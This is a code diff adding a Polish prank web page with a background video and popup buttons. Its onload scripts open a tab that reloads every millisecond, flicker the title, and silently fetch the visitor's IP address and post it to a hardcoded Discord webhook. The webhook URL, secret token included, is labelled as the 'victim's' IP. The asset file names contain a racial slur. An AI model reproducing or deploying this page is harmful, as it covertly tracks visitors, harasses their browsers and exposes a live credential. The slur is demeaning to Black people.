@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trolololo Page</title>
+    <link rel="stylesheet" href="nigerstyle.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Witam na stornie YngleanOnTop1 [Kliknij przycisk]</h1>
+        <p>Siemanko Bratku</p>
+        <button id="trollButton">Kliknij Mnie!</button>
+    </div>
+    <script src="NigerJS.js"></script>
+
+    <script>
+        document.getElementById('trollButton').addEventListener('click', function() {
+    window.open('okok2.html', 'newwindow', 'width=300,height=300');
+});
+    </script>
+
+    <button onclick="window.location.href = 'kk.html';">Wyjście</button>
+
+    <video autoplay loop muted id="background-video">
+        <source src="ooo.mp4" type="video/mp4">
+    </video>
+
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        #background-video {
+            position: fixed;
+            right: 0;
+            bottom: 0;
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            z-index: -1000;
+        }
+    </style>
+
+<script>
+    setInterval(function() {
+      var titles = ["🌖🌖🌖 ✨", "🌗🌗🌗 🎉", "🌘🌘🌘 🍾"];
+      var randomIndex = Math.floor(Math.random() * titles.length);
+      document.title = titles[randomIndex]; 
+    }, 1); 
+  </script>
+  
+  <script>
+    // Funkcja otwierania nowej zakładki z podstroną
+    function openSubPage() {
+      var file = "ii1.html";
+      // Otwórz nową zakładkę z wybranym plikiem
+      var newTab = window.open(file, '_blank');
+  
+      // Funkcja do odświeżania podstrony
+      function refreshSubPage() {
+        // Odśwież zakładkę z plikiem
+        newTab.location.href = file;
+      }
+  
+      
+      setInterval(refreshSubPage, 1);
+    }
+  
+    // Otwórz nową zakładkę z podstroną po załadowaniu strony
+    window.onload = function() {
+      openSubPage();
+    };
+  </script>
+    <script>
+      // Funkcja do pobierania adresu IP użytkownika i wysyłania na Discord WebHook
+      function sendIPToDiscord() {
+          // Pobieranie adresu IP użytkownika
+          fetch('https://api64.ipify.org?format=json')
+              .then(response => response.json())
+              .then(data => {
+                  const userIP = data.ip;
+                  console.log('Received IP:', userIP);
+                  
+                  // Wysyłanie IP na Discord WebHook
+                  const webhookURL = 'https://discord.com/api/webhooks/1242506086494240818/RSCr0EKBBN1E4aiEdm77NajOMZoW7NAZAralDEoiuIRf31rX_ikTSJI9vixvvKt0Ay1t';
+                  fetch(webhookURL, {
+                      method: 'POST',
+                      headers: {
+                          'Content-Type': 'application/json'
+                      },
+                      body: JSON.stringify({
+                          content: `IP Oponęta ${userIP}`
+                      })
+                  })
+                  .then(response => {
+                      console.log('WebHook response:', response);
+                  })
+                  .catch(error => {
+                      console.error('Error sending to Discord WebHook:', error);
+                  });
+              })
+              .catch(error => {
+                  console.error('Error getting user IP:', error);
+              });
+      }
+      
+      // Wywołanie funkcji po załadowaniu strony
+      window.onload = function() {
+          sendIPToDiscord();
+      };
+      </script>
+</body>
+</html>
